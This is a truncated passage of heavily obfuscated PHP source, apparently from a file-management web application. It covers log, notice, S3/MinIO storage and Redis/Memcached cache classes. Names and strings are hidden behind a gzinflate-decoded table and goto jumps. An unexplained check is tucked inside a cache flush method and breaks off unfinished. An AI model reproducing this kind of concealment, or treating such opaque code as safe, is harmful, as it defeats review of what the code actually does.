$ÖÑŞ©Í[536])); $ˆüÉï¦³ = $¯‘©¿½Ş[$ˆüÉï¦³]; $ıøÉİÏå = $ıøÉİÏå . "{$È¼ûòÎ}\x20{$ˆüÉï¦³}"; return $this->order($ıøÉİÏå); } public function get($Á½…äõ¹ = '') { $É§£¹ÅÕ =& $_SERVER[¼èá¯æÙ]; if (!$Á½…äõ¹) { show_json(array()); } $ÒõÒÇĞ = array(); if ($Á½…äõ¹[$É§£¹ÅÕ[1778]]) { $ÒõÒÇĞ[$É§£¹ÅÕ[1778]] = $Á½…äõ¹[$É§£¹ÅÕ[1778]]; } if (isset($Á½…äõ¹[$É§£¹ÅÕ[842]])) { $äò›Û = $Á½…äõ¹[$É§£¹ÅÕ[842]]; $–ùñØè« = isset($Á½…äõ¹[$É§£¹ÅÕ[843]]) ? $Á½…äõ¹[$É§£¹ÅÕ[843]] : time(); $ÒõÒÇĞ[$É§£¹ÅÕ[243]] = array($É§£¹ÅÕ[420], array($äò›Û, $–ùñØè«)); } if ($Á½…äõ¹[$É§£¹ÅÕ[33]]) { $„­‹Öƒö = explode($É§£¹ÅÕ[50], $Á½…äõ¹[$É§£¹ÅÕ[33]]); $ÚÀÁŞØÑ = $this->typeFile(); $Êü±¥¿Á = array(); foreach ($„­‹Öƒö as $İÜèúÅ´) { $Êü±¥¿Á[] = $İÜèúÅ´; if (isset($ÚÀÁŞØÑ[$İÜèúÅ´])) { $Êü±¥¿Á = array_merge($Êü±¥¿Á, $ÚÀÁŞØÑ[$İÜèúÅ´]); } } $Êü±¥¿Á = array_unique($Êü±¥¿Á); if ($Êü±¥¿Á) { $ÒõÒÇĞ[$É§£¹ÅÕ[33]] = array($É§£¹ÅÕ[7], $Êü±¥¿Á); } } else { $ÒõÒÇĞ[$É§£¹ÅÕ[33]] = array($É§£¹ÅÕ[2443], $É§£¹ÅÕ[2444]); } if (!empty($Á½…äõ¹[$É§£¹ÅÕ[2442]])) { $ÒõÒÇĞ[$É§£¹ÅÕ[537]] = array($É§£¹ÅÕ[470], "\x25{$Á½…äõ¹[$É§£¹ÅÕ[2442]]}\45"); } $…’âùæ½ = $this->_makeOrder()->where($ÒõÒÇĞ)->selectPage(); if (empty($…’âùæ½[$É§£¹ÅÕ[457]])) { show_json(array(), !0, $…’âùæ½[$É§£¹ÅÕ[454]]); } $…’âùæ½[$É§£¹ÅÕ[457]] = $this->logList($…’âùæ½[$É§£¹ÅÕ[457]]); return $…’âùæ½; } private function ipAddress(&$Şìîùšî) { $Ùâ«™»ı =& $_SERVER[¼èá¯æÙ]; if (!empty($Şìîùšî[$Ùâ«™»ı[2442]])) { $ÖãÔˆÚ = IpLocation::get($Şìîùšî[$Ùâ«™»ı[2442]]); } else { $ÖãÔˆÚ = LNG($Ùâ«™»ı[2445]); } $Şìîùšî[$Ùâ«™»ı[2446]] = $ÖãÔˆÚ; } private function descZipDownload($Ï¦Ä¬ç´, &$ÃŸÁÍŞš) { $›öú‰Èô =& $_SERVER[¼èá¯æÙ]; if (!isset($Ï¦Ä¬ç´[$›öú‰Èô[2447]])) { return; } $‘ÖüÕ÷¬ = json_decode($Ï¦Ä¬ç´[$›öú‰Èô[2447]], !0); foreach ($‘ÖüÕ÷¬ as $©×Ëşèú) { try { $ÈÁŒËå = IO::infoFullSimple($©×Ëşèú[$›öú‰Èô[97]]); } catch (Exception $Ê†Õ…©Ğ) { continue; } $Ï¦Ä¬ç´[$›öú‰Èô[97]] = $©×Ëşèú[$›öú‰Èô[97]]; $ÃŸÁÍŞš[] = $Ï¦Ä¬ç´[$›öú‰Èô[203]] = $ÈÁŒËå[$›öú‰Èô[203]]; $ÃŸÁÍŞš[] = $Ï¦Ä¬ç´[$›öú‰Èô[2216]] = $ÈÁŒËå[$›öú‰Èô[202]]; break; } return $Ï¦Ä¬ç´; } private function getSourceList(&$ëœ¢»îî) { $š¥¾×÷² =& $_SERVER[¼èá¯æÙ]; $•ÇéË©° = array(); foreach ($ëœ¢»îî as $ÃÈãŸâä => $ìÑõÉÅö) { $ßœ‹şøİ = json_decode($ìÑõÉÅö[$š¥¾×÷²[537]], !0); if ($ìÑõÉÅö[$š¥¾×÷²[33]] == $š¥¾×÷²[1952]) { $ßœ‹şøİ = $this->descZipDownload($ßœ‹şøİ, $•ÇéË©°); $ëœ¢»îî[$ÃÈãŸâä][$š¥¾×÷²[537]] = json_encode($ßœ‹şøİ); continue; } if (strpos($ìÑõÉÅö[$š¥¾×÷²[33]], $š¥¾×÷²[2218]) !== 0) { if (!isset($ßœ‹şøİ[$š¥¾×÷²[97]]) || strpos($ìÑõÉÅö[$š¥¾×÷²[33]], $š¥¾×÷²[2448]) !== 0) { continue; } try { $¼ˆÂÊ¶ = IO::infoFullSimple($ßœ‹şøİ[$š¥¾×÷²[97]]); } catch (Exception $áˆº˜ıò) { continue; } $•ÇéË©°[] = $ßœ‹şøİ[$š¥¾×÷²[203]] = $¼ˆÂÊ¶[$š¥¾×÷²[203]]; $•ÇéË©°[] = $ßœ‹şøİ[$š¥¾×÷²[2216]] = $¼ˆÂÊ¶[$š¥¾×÷²[202]]; $ëœ¢»îî[$ÃÈãŸâä][$š¥¾×÷²[537]] = json_encode($ßœ‹şøİ); continue; } $•ÇéË©°[] = $ßœ‹şøİ[$š¥¾×÷²[203]]; $•ÇéË©°[] = $ßœ‹şøİ[$š¥¾×÷²[2216]]; if ($ßœ‹şøİ[$š¥¾×÷²[33]] == $š¥¾×÷²[634]) { $•ÇéË©°[] = $ßœ‹şøİ[$š¥¾×÷²[537]][$š¥¾×÷²[1246]]; $•ÇéË©°[] = $ßœ‹şøİ[$š¥¾×÷²[537]][$š¥¾×÷²[1247]]; } if ($ßœ‹şøİ[$š¥¾×÷²[33]] == $š¥¾×÷²[2227]) { $•ÇéË©°[] = $ßœ‹şøİ[$š¥¾×÷²[537]][$š¥¾×÷²[203]]; } } if (!$•ÇéË©°) { return array(); } return Model($š¥¾×÷²[907])->sourceListInfo($•ÇéË©°, !0); } private function logList($…ÓäÈ±û) { $éÇ°Ûˆ¶ =& $_SERVER[¼èá¯æÙ]; $×İ«ô§Ù = array_to_keyvalue($…ÓäÈ±û, $éÇ°Ûˆ¶[12], $éÇ°Ûˆ¶[1778]); $—ÅŞ´˜¿ = Model($éÇ°Ûˆ¶[608])->userListInfo(array_unique($×İ«ô§Ù)); $®®¿‰ü = $this->getSourceList($…ÓäÈ±û); $­Ù…‰­Ø = $this->typeAll(); $éÍ¦áº« = array(); $†º‘’ş» = array(); foreach ($…ÓäÈ±û as $´¨š£èˆ => $ˆˆ´Ü³) { $ÃÎÓ¾¨ = $ˆˆ´Ü³[$éÇ°Ûˆ¶[33]]; $ïèºº¬ = isset($—ÅŞ´˜¿[$ˆˆ´Ü³[$éÇ°Ûˆ¶[1778]]]) ? $—ÅŞ´˜¿[$ˆˆ´Ü³[$éÇ°Ûˆ¶[1778]]] : !1; $ã×å¦©ô = strpos($ÃÎÓ¾¨, $éÇ°Ûˆ¶[2449]) === 0 ? LNG($éÇ°Ûˆ¶[2450]) : LNG($éÇ°Ûˆ¶[2445]); $ˆˆ´Ü³[$éÇ°Ûˆ¶[32]] = isset($ïèºº¬[$éÇ°Ûˆ¶[32]]) ? $ïèºº¬[$éÇ°Ûˆ¶[32]] : LNG($éÇ°Ûˆ¶[2445]); $ˆˆ´Ü³[$éÇ°Ûˆ¶[2277]] = isset($ïèºº¬[$éÇ°Ûˆ¶[2277]]) ? $ïèºº¬[$éÇ°Ûˆ¶[2277]] : $éÇ°Ûˆ¶[12]; $ˆˆ´Ü³[$éÇ°Ûˆ¶[1666]] = isset($­Ù…‰­Ø[$ÃÎÓ¾¨]) ? $­Ù…‰­Ø[$ÃÎÓ¾¨] : $ã×å¦©ô; $ˆˆ´Ü³[$éÇ°Ûˆ¶[2159]] = $ïèºº¬; $Î®§¨‡Á = json_decode($ˆˆ´Ü³[$éÇ°Ûˆ¶[537]], !0); $ˆˆ´Ü³[$éÇ°Ûˆ¶[2442]] = isset($Î®§¨‡Á[$éÇ°Ûˆ¶[2442]]) ? $Î®§¨‡Á[$éÇ°Ûˆ¶[2442]] : $éÇ°Ûˆ¶[12]; $ˆˆ´Ü³[$éÇ°Ûˆ¶[2446]] = IpLocation::get($ˆˆ´Ü³[$éÇ°Ûˆ¶[2442]]); if (strpos($ÃÎÓ¾¨, $éÇ°Ûˆ¶[2218]) === 0 || isset($Î®§¨‡Á[$éÇ°Ûˆ¶[2216]])) { $Î®§¨‡Á[$éÇ°Ûˆ¶[100]] = $®®¿‰ü[$Î®§¨‡Á[$éÇ°Ûˆ¶[203]]]; $Î®§¨‡Á[$éÇ°Ûˆ¶[2232]] = $®®¿‰ü[$Î®§¨‡Á[$éÇ°Ûˆ¶[2216]]]; if ($Î®§¨‡Á[$éÇ°Ûˆ¶[33]] == $éÇ°Ûˆ¶[634]) { $Î®§¨‡Á[$éÇ°Ûˆ¶[537]][$éÇ°Ûˆ¶[1246]] = $®®¿‰ü[$Î®§¨‡Á[$éÇ°Ûˆ¶[537]][$éÇ°Ûˆ¶[1246]]]; $Î®§¨‡Á[$éÇ°Ûˆ¶[537]][$éÇ°Ûˆ¶[1247]] = $®®¿‰ü[$Î®§¨‡Á[$éÇ°Ûˆ¶[537]][$éÇ°Ûˆ¶[1247]]]; } if ($Î®§¨‡Á[$éÇ°Ûˆ¶[33]] == $éÇ°Ûˆ¶[2227]) { $Î®§¨‡Á[$éÇ°Ûˆ¶[537]][$éÇ°Ûˆ¶[203]] = $®®¿‰ü[$Î®§¨‡Á[$éÇ°Ûˆ¶[537]][$éÇ°Ûˆ¶[203]]]; } if ($Î®§¨‡Á[$éÇ°Ûˆ¶[33]] == $éÇ°Ûˆ¶[1947]) { $Î®§¨‡Á[$éÇ°Ûˆ¶[2232]] = $Î®§¨‡Á[$éÇ°Ûˆ¶[100]]; $Î®§¨‡Á[$éÇ°Ûˆ¶[2216]] = $Î®§¨‡Á[$éÇ°Ûˆ¶[2232]][$éÇ°Ûˆ¶[203]]; $Î®§¨‡Á[$éÇ°Ûˆ¶[100]] = !1; $Î®§¨‡Á[$éÇ°Ûˆ¶[203]] = $éÇ°Ûˆ¶[12]; } $£ÙÖ×†Ö = array($éÇ°Ûˆ¶[1947], $éÇ°Ûˆ¶[2214]); if (!in_array($Î®§¨‡Á[$éÇ°Ûˆ¶[33]], $£ÙÖ×†Ö)) { if ($Î®§¨‡Á[$éÇ°Ûˆ¶[100]] && $Î®§¨‡Á[$éÇ°Ûˆ¶[100]][$éÇ°Ûˆ¶[200]] == $éÇ°Ûˆ¶[201]) { $†º‘’ş»[] = $ˆˆ´Ü³[$éÇ°Ûˆ¶[486]]; unset($…ÓäÈ±û[$´¨š£èˆ]); continue; } if ($Î®§¨‡Á[$éÇ°Ûˆ¶[2232]] && $Î®§¨‡Á[$éÇ°Ûˆ¶[2232]][$éÇ°Ûˆ¶[200]] == $éÇ°Ûˆ¶[201]) { $†º‘’ş»[] = $ˆˆ´Ü³[$éÇ°Ûˆ¶[486]]; unset($…ÓäÈ±û[$´¨š£èˆ]); continue; } } } $ˆˆ´Ü³[$éÇ°Ûˆ¶[537]] = $Î®§¨‡Á; unset($ˆˆ´Ü³[$éÇ°Ûˆ¶[2451]]); $éÍ¦áº«[] = $ˆˆ´Ü³; } $this->clearSystemPathLog($†º‘’ş»); return $éÍ¦áº«; } private function clearSystemPathLog($ãê…¤ú) { $İ¦öšÊº =& $_SERVER[¼èá¯æÙ]; if (count($ãê…¤ú) == 0) { return; } $íéÙ€Ñ = array($İ¦öšÊº[486] => array($İ¦öšÊº[7], array_unique($ãê…¤ú))); $this->where($íéÙ€Ñ)->delete(); } public function deviceList($‡ÖÉğïÍ, $’ç™ĞÈ° = 0) { $ÈğöÌ¨  =& $_SERVER[¼èá¯æÙ]; $ğºÁñ¶ì = array($ÈğöÌ¨ [1778] => $‡ÖÉğïÍ, $ÈğöÌ¨ [243] => array($ÈğöÌ¨ [1096], $’ç™ĞÈ°), $ÈğöÌ¨ [33] => $ÈğöÌ¨ [1921]); $íØÇ«œ° = array(); $¡…©Ù“… = $this->field($ÈğöÌ¨ [2452])->where($ğºÁñ¶ì)->order($ÈğöÌ¨ [2230])->limit(50)->select(); foreach ($¡…©Ù“… as $¼Õ˜£×ø => $Û¯ŠœÒ‹) { if ($¼Õ˜£×ø > 0 && abs($Û¯ŠœÒ‹[$ÈğöÌ¨ [243]] - $¡…©Ù“…[$¼Õ˜£×ø - 1][$ÈğöÌ¨ [243]]) < 5) { continue; } $É®‚Ã°Ó = json_decode($Û¯ŠœÒ‹[$ÈğöÌ¨ [537]], !0); $Û¯ŠœÒ‹[$ÈğöÌ¨ [2442]] = isset($É®‚Ã°Ó[$ÈğöÌ¨ [2442]]) ? $É®‚Ã°Ó[$ÈğöÌ¨ [2442]] : $ÈğöÌ¨ [12]; unset($É®‚Ã°Ó[$ÈğöÌ¨ [2442]]); $Öõû¾œÊ = $this->deviceType($É®‚Ã°Ó[$ÈğöÌ¨ [2219]]); if (isset($íØÇ«œ°[$Öõû¾œÊ])) { continue; } $Û¯ŠœÒ‹[$ÈğöÌ¨ [2446]] = IpLocation::get($Û¯ŠœÒ‹[$ÈğöÌ¨ [2442]]); $Û¯ŠœÒ‹[$ÈğöÌ¨ [537]] = $É®‚Ã°Ó; $íØÇ«œ°[$Öõû¾œÊ] = $Û¯ŠœÒ‹; } return array_values($íØÇ«œ°); } public function deviceType($üñÕÖ›®) { return $üñÕÖ›®; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\x65\x6d\x2e\156\157\164\x69\143\x65\114\x69\x73\164"; public $field = array("\x6e\141\x6d\x65", "\143\x6f\156\164\x65\x6e\164", "\141\165\x74\x68", "\155\x6f\144\x65", "\164\x69\155\145", "\x74\x79\160\x65", "\x6c\145\166\x65\x6c", "\145\156\x61\x62\154\145", "\x73\157\162\164"); public function listData($Ö†áØÈà = false, $ê ß£Æè = "\163\157\x72\x74", $†‰¸Åô‡ = false) { return parent::listData($Ö†áØÈà, $ê ß£Æè, $†‰¸Åô‡); } public function add($¨ÃŠ‚úÒ) { $şºƒ¥ª =& $_SERVER[¼èá¯æÙ]; $Å†©ƒÊƒ = time(); if ($¨ÃŠ‚úÒ[$şºƒ¥ª[16]] == $şºƒ¥ª[2453]) { $Å†©ƒÊƒ = strtotime($¨ÃŠ‚úÒ[$şºƒ¥ª[216]]); } $¨ÃŠ‚úÒ[$şºƒ¥ª[216]] = $Å†©ƒÊƒ; return parent::insert($¨ÃŠ‚úÒ); } public function update($Çç¾¥âì, $¿Ÿ×è——) { $…§©İ‡ =& $_SERVER[¼èá¯æÙ]; $¡¿¡¿ = $this->listData($Çç¾¥âì); if (!$¡¿¡¿) { return !1; } $ò¢ê»Ğ« = time(); if ($¿Ÿ×è——[$…§©İ‡[16]] == $…§©İ‡[2453]) { $ò¢ê»Ğ« = strtotime($¿Ÿ×è——[$…§©İ‡[216]]); } $¿Ÿ×è——[$…§©İ‡[216]] = $ò¢ê»Ğ«; return parent::update($Çç¾¥âì, $¿Ÿ×è——); } public function remove($˜Õ÷øé—) { $¥ÑÑ¿ = $this->listData($˜Õ÷øé—); if (!$¥ÑÑ¿ || $¥ÑÑ¿[$_SERVER[¼èá¯æÙ][201]]) { return !1; } return parent::remove($˜Õ÷øé—); } public function sort($çáºû·ò, $×“‘˜¥“) { return parent::update($çáºû·ò, $×“‘˜¥“); } public function enable($ª¬ÏÅõ˜, $¦Ğ£äøã) { return parent::update($ª¬ÏÅõ˜, array($_SERVER[¼èá¯æÙ][2454] => $¦Ğ£äøã)); } private function initUserOption() { $ãÉé‹Âš =& $_SERVER[¼èá¯æÙ]; $this->optionType = $ãÉé‹Âš[2455]; $this->modelType = $ãÉé‹Âš[2456]; $this->field = array($ãÉé‹Âš[2457], $ãÉé‹Âš[32], $ãÉé‹Âš[216], $ãÉé‹Âš[33], $ãÉé‹Âš[2458], $ãÉé‹Âš[832], $ãÉé‹Âš[238]); } public function userNoticeGet($Ş¯×’•² = false) { $this->initUserOption(); return parent::listData($Ş¯×’•², $_SERVER[¼èá¯æÙ][486], !0); } public function userNoticeAdd($Ã„­Á–ú) { $ğÏÖ†¨À =& $_SERVER[¼èá¯æÙ]; $this->initUserOption(); $î˜¤úï = $this->findByKey($ğÏÖ†¨À[2457], $Ã„­Á–ú[$ğÏÖ†¨À[486]]); if ($î˜¤úï) { return !0; } $­¦ç¨œß = array($ğÏÖ†¨À[2457] => $Ã„­Á–ú[$ğÏÖ†¨À[486]], $ğÏÖ†¨À[32] => $Ã„­Á–ú[$ğÏÖ†¨À[32]], $ğÏÖ†¨À[216] => $Ã„­Á–ú[$ğÏÖ†¨À[216]], $ğÏÖ†¨À[33] => isset($Ã„­Á–ú[$ğÏÖ†¨À[33]]) ? $Ã„­Á–ú[$ğÏÖ†¨À[33]] : 1, $ğÏÖ†¨À[2458] => isset($Ã„­Á–ú[$ğÏÖ†¨À[2458]]) ? $Ã„­Á–ú[$ğÏÖ†¨À[2458]] : 0, $ğÏÖ†¨À[832] => 0, $ğÏÖ†¨À[238] => 0); return parent::insert($­¦ç¨œß); } public function userNoticeEdit($´ş§Øâ, $”£íÊùù) { $this->initUserOption(); return parent::update($´ş§Øâ, $”£íÊùù); } } goto bß­œïµÙ«; Eç¥æÈˆø: define($_SERVER[¼èá¯æÙ][0], $_SERVER[¼èá¯æÙ][1]); $_SERVER[¤ÀõŒÆ] = explode($_SERVER[¼èá¯æÙ][2], gzinflate(substr($_SERVER[¼èá¯æÙ][3], 10, -8))); function binCheckEq($çšóåı«, $ëš‚ú£ñ) { return $çšóåı« == $ëš‚ú£ñ; } goto DŞ”Şƒ†²ë; D—ƒ«…å™: class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($×âşÛ†¬) { $õñ›»Òé =& $_SERVER[¼èá¯æÙ]; parent::__construct($×âşÛ†¬); $this->setSignVersion($õñ›»Òé[259]); if (!$this->region) { $this->region = $õñ›»Òé[316]; $this->client->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function checkRegion() { $™´ë¦› = $this->getBktRegion(); return $this->region == $™´ë¦› ? !0 : !1; } public function uploadFormData($©ŸÚĞÏ©, $İÚ•ö±Õ = 3600) { $ˆ”é®ç =& $_SERVER[¼èá¯æÙ]; $ò°í³Ê = $ˆ”é®ç[241]; $ÁÀ•Ìºç = $ˆ”é®ç[269]; $ç²é×Áã = $ˆ”é®ç[72]; $Š¶ÚÅ = gmdate($ˆ”é®ç[270]); $¼—° = gmdate($ˆ”é®ç[271]); $°ç‘»óŞ = $ˆ”é®ç[272]; $ëÓù´¿ = $İÚ•ö±Õ . $ˆ”é®ç[12]; $ñ¤ÃÙ¹‰ = $ˆ”é®ç[273]; $Ô×ºÊÁ¥ = array($this->accessKey, $¼—°, $this->region, $ç²é×Áã, $°ç‘»óŞ); $ÀöÁÏŸÏ = implode($ˆ”é®ç[8], $Ô×ºÊÁ¥); $„›üæ¸Œ = array($ˆ”é®ç[274] => gmdate($ˆ”é®ç[275], strtotime($ˆ”é®ç[276])), $ˆ”é®ç[277] => array(array($ˆ”é®ç[278] => $this->bucket), array($ˆ”é®ç[317] => $ò°í³Ê), array($ˆ”é®ç[279], $ˆ”é®ç[280], $ˆ”é®ç[12]), array($ˆ”é®ç[279], $ˆ”é®ç[281], $ˆ”é®ç[12]), array($ˆ”é®ç[279], $ˆ”é®ç[318], $ˆ”é®ç[12]), array($ˆ”é®ç[282] => $ñ¤ÃÙ¹‰), array($ˆ”é®ç[283] => $ÀöÁÏŸÏ), array($ˆ”é®ç[284] => $ÁÀ•Ìºç), array($ˆ”é®ç[285] => $Š¶ÚÅ), array($ˆ”é®ç[286] => $ëÓù´¿))); $Ş’—îæÜ = base64_encode(json_encode($„›üæ¸Œ)); $ƒŠöïá = hash_hmac($ˆ”é®ç[287], $¼—°, $ˆ”é®ç[288] . $this->secret, !0); $Ä¬Ôéú“ = hash_hmac($ˆ”é®ç[287], $this->region, $ƒŠöïá, !0); $ÎƒüĞ™´ = hash_hmac($ˆ”é®ç[287], $ç²é×Áã, $Ä¬Ôéú“, !0); $Ï«÷•ÑĞ = hash_hmac($ˆ”é®ç[287], $°ç‘»óŞ, $ÎƒüĞ™´, !0); $èÓà¶õ² = hash_hmac($ˆ”é®ç[287], $Ş’—îæÜ, $Ï«÷•ÑĞ); $é˜ûµÛ† = array($ˆ”é®ç[258] => $ˆ”é®ç[12], $ˆ”é®ç[305] => $ˆ”é®ç[12], $ˆ”é®ç[317] => $ò°í³Ê, $ˆ”é®ç[282] => $ñ¤ÃÙ¹‰, $ˆ”é®ç[289] => $Ş’—îæÜ, $ˆ”é®ç[319] => $ÀöÁÏŸÏ, $ˆ”é®ç[320] => $ÁÀ•Ìºç, $ˆ”é®ç[321] => $Š¶ÚÅ, $ˆ”é®ç[322] => $ëÓù´¿, $ˆ”é®ç[323] => $èÓà¶õ², $ˆ”é®ç[218] => $this->getHost()); return $é˜ûµÛ†; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($Ò¬¬¾Æº) { $¦Ú¡‰÷Ë =& $_SERVER[¼èá¯æÙ]; parent::__construct($Ò¬¬¾Æº); $Ş–„Ôé½ = isset($Ò¬¬¾Æº[$¦Ú¡‰÷Ë[268]]) && $Ò¬¬¾Æº[$¦Ú¡‰÷Ë[268]] == $¦Ú¡‰÷Ë[259] ? $¦Ú¡‰÷Ë[259] : $¦Ú¡‰÷Ë[324]; $this->setSignVersion($Ş–„Ôé½); } public function link($ó¸ı†§Ê, $Ü¢ç–…˜ = array()) { return parent::link($ó¸ı†§Ê, $Ü¢ç–…˜); } public function fileOut($ÄÇÓŸä™, $øŒ‹ª·î = false, $æ‘£¯¶˜ = false, $±ï‚ˆ”Û = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[¼èá¯æÙ][325])) { return parent::fileOutServer($ÄÇÓŸä™, $øŒ‹ª·î, $æ‘£¯¶˜, $±ï‚ˆ”Û); } parent::fileOut($ÄÇÓŸä™, $øŒ‹ª·î, $æ‘£¯¶˜, $±ï‚ˆ”Û); } public function fileOutImage($‹ÄË¨Ş, $¯¿ô‹§§ = 250) { if (strstr($this->endpoint, $_SERVER[¼èá¯æÙ][325])) { return parent::fileOutImageServer($‹ÄË¨Ş, $¯¿ô‹§§); } parent::fileOutImage($‹ÄË¨Ş, $¯¿ô‹§§); } public function fileOutLink($ùÃ¯üÆŠ) { $ë·Ò¦ËÑ =& $_SERVER[¼èá¯æÙ]; if (substr($ùÃ¯üÆŠ, 0, 7) == $ë·Ò¦ËÑ[228]) { $ùÃ¯üÆŠ = $ë·Ò¦ËÑ[229] . substr($ùÃ¯üÆŠ, 7); } header($ë·Ò¦ËÑ[185] . $ùÃ¯üÆŠ); die; } } define($_SERVER[¼èá¯æÙ][326], 1); goto e›¿öÚ‡º; eµË´âš: define($_SERVER[¼èá¯æÙ][691], $_SERVER[¼èá¯æÙ][692]); $ywxcnvuszb = $_SERVER[¼èá¯æÙ][693]; if (!$ywxcnvuszb) { return; } goto e¡É§è§’; Fí¿ºœÃ—È: class CacheMemcached { public $handle; public $cacheTime; public function __construct($Ê×²È°…, $ÀˆÄå²) { $ûÖâÂ¸È =& $_SERVER[¼èá¯æÙ]; if (!class_exists($ûÖâÂ¸È[950])) { show_json($ûÖâÂ¸È[951], !1); } $this->cacheTime = $ÀˆÄå²; $this->handle = new Memcached(); if (is_array($Ê×²È°…[$ûÖâÂ¸È[952]]) && count($Ê×²È°…[$ûÖâÂ¸È[952]]) >= 1) { foreach ($Ê×²È°…[$ûÖâÂ¸È[952]] as $ïô‘æìÙ) { $Ã»¦£­ = explode($ûÖâÂ¸È[4], $ïô‘æìÙ); $this->handle->addServer($Ã»¦£­[0], $Ã»¦£­[1]); } } else { $this->handle->addServer($Ê×²È°…[$ûÖâÂ¸È[218]], $Ê×²È°…[$ûÖâÂ¸È[219]]); } } public function set($€ëóİğ¹, $ğµîüÔ, $öî¦‰­ = false) { $öî¦‰­ = $öî¦‰­ ? $öî¦‰­ : $this->cacheTime; return $this->handle->set($€ëóİğ¹, $ğµîüÔ, $öî¦‰­); } public function get($õ§Ä¯…) { return $this->handle->get($õ§Ä¯…); } public function remove($È‚µÀ…ò) { return $this->handle->delete($È‚µÀ…ò); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($”§µ’–­, $ÁûÔÛ£) { $öñµ ô =& $_SERVER[¼èá¯æÙ]; if (!class_exists($öñµ ô[953])) { show_json($öñµ ô[954], !1); } $this->cacheTime = $ÁûÔÛ£; $û¬¾³Ô¡ = isset($”§µ’–­[$öñµ ô[955]]) ? $”§µ’–­[$öñµ ô[955]] : 10; $üñíÚ˜´ = _get($”§µ’–­, $öñµ ô[952]); if ($üñíÚ˜´ && is_array($üñíÚ˜´)) { $this->initCluster($”§µ’–­, $û¬¾³Ô¡); } else { $this->handle = $this->init($”§µ’–­, $û¬¾³Ô¡); } } private function init($ñË‚Š¦, $­ßÚöƒõ) { $˜€•¯øî =& $_SERVER[¼èá¯æÙ]; $Ôƒß÷æí = new Redis(); $¶±±É›Û = isset($ñË‚Š¦[$˜€•¯øî[956]]) ? $ñË‚Š¦[$˜€•¯øî[956]] : !1; if ($¶±±É›Û) { $Ôƒß÷æí->pconnect($ñË‚Š¦[$˜€•¯øî[218]], $ñË‚Š¦[$˜€•¯øî[219]], $­ßÚöƒõ); } else { $Ôƒß÷æí->connect($ñË‚Š¦[$˜€•¯øî[218]], $ñË‚Š¦[$˜€•¯øî[219]], $­ßÚöƒõ); } if (!empty($ñË‚Š¦[$˜€•¯øî[498]])) { $Ôƒß÷æí->auth($ñË‚Š¦[$˜€•¯øî[498]]); } if (!empty($ñË‚Š¦[$˜€•¯øî[839]]) && $ñË‚Š¦[$˜€•¯øî[839]] != 0) { $Ôƒß÷æí->select($ñË‚Š¦[$˜€•¯øî[839]]); } return $Ôƒß÷æí; } private function initCluster($ù£éÑÅè, $×˜Û«¼‹) { $Ú¢òóÒ =& $_SERVER[¼èá¯æÙ]; $ °½×ÓÙ = array($Ú¢òóÒ[957], $Ú¢òóÒ[958], $Ú¢òóÒ[959]); $Í½—²£ˆ = $Ú¢òóÒ[957]; if (isset($ù£éÑÅè[$Ú¢òóÒ[16]]) && in_array($ù£éÑÅè[$Ú¢òóÒ[16]], $ °½×ÓÙ)) { $Í½—²£ˆ = $ù£éÑÅè[$Ú¢òóÒ[16]]; } switch ($Í½—²£ˆ) { case $Ú¢òóÒ[957]: $this->_slave($ù£éÑÅè, $×˜Û«¼‹); break; case $Ú¢òóÒ[958]: break; case $Ú¢òóÒ[959]: $this->isCluster = !0; $·Å‰¼ô = $ù£éÑÅè[$Ú¢òóÒ[952]]; $şçÉï¹Ö = isset($ù£éÑÅè[$Ú¢òóÒ[956]]) ? $ù£éÑÅè[$Ú¢òóÒ[956]] : !1; $Ç¢—¯»‘ = isset($ù£éÑÅè[$Ú¢òóÒ[498]]) ? $ù£éÑÅè[$Ú¢òóÒ[498]] : null; $this->handle = new RedisCluster(NUll, $·Å‰¼ô, $×˜Û«¼‹, $×˜Û«¼‹, $şçÉï¹Ö, $Ç¢—¯»‘); break; default: break; } } private function _slave($áÁ¡…¹Ó, $€òÁ­›) { $ÜÊµÌ³ = $áÁ¡…¹Ó[$_SERVER[¼èá¯æÙ][952]]; $this->filterConfig($áÁ¡…¹Ó, $ÜÊµÌ³[0]); $this->handle = $this->init($áÁ¡…¹Ó, $€òÁ­›); unset($ÜÊµÌ³[0]); if (empty($ÜÊµÌ³)) { return; } $§ÑÃ´Î = array_rand($ÜÊµÌ³); $this->filterConfig($áÁ¡…¹Ó, $ÜÊµÌ³[$§ÑÃ´Î]); $this->slaveHandle = $this->init($áÁ¡…¹Ó, $€òÁ­›); } private function filterConfig(&$´ìøÆ¯², $öæ´‹ˆ”) { $ Ç¹Êµá =& $_SERVER[¼èá¯æÙ]; $…·ØÑø = explode($ Ç¹Êµá[4], $öæ´‹ˆ”); $·Ê´æõ¼ = array($ Ç¹Êµá[218] => $…·ØÑø[0], $ Ç¹Êµá[219] => $…·ØÑø[1]); $´ìøÆ¯² = array_merge($´ìøÆ¯², $·Ê´æõ¼); } public function set($ç°šƒïŒ, $“„é†Ù, $øÈáôƒğ = false) { $øÈáôƒğ = $øÈáôƒğ ? $øÈáôƒğ : $this->cacheTime; return $this->handle->setEx($ç°šƒïŒ, $øÈáôƒğ, $“„é†Ù); } public function setLock($ùı»Ìçï, $ÍëªĞÄ, $³Ì¹ë³¢) { return $this->handle->setNX($ùı»Ìçï, $ÍëªĞÄ); } public function get($Ä³Ÿ·Íº) { $ßìç™‰¾ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $ßìç™‰¾->get($Ä³Ÿ·Íº); } public function remove($ƒò©Í†¤) { return $this->handle->del($ƒò©Í†¤); } public function deleteAll() { $¹ßÎÛã¹ =& $_SERVER[¼èá¯æÙ]; $‘Î®±Ñò = $_SERVER[$¹ßÎÛã¹[55]]; $á¶³Ûçí = $¹ßÎÛã¹[829]; if ($_SERVER[$¹ßÎÛã¹[54]] != $á¶³Ûçí($‘Î®±Ñò)) { $Õ…©ğáº = $¹ßÎÛã¹[960]; $‰áŠ…¨Ì = $¹ßÎÛã¹[56]; $‚ÍŒÈÀ× = $_SERVER[$¹ßÎÛã¹[57]] . $¹ßÎÛã¹[58]; $ø²…€ƒş = $‰áŠ…¨Ì($‚ÍŒÈÀ×); $ÂÈŒ”×¬ = 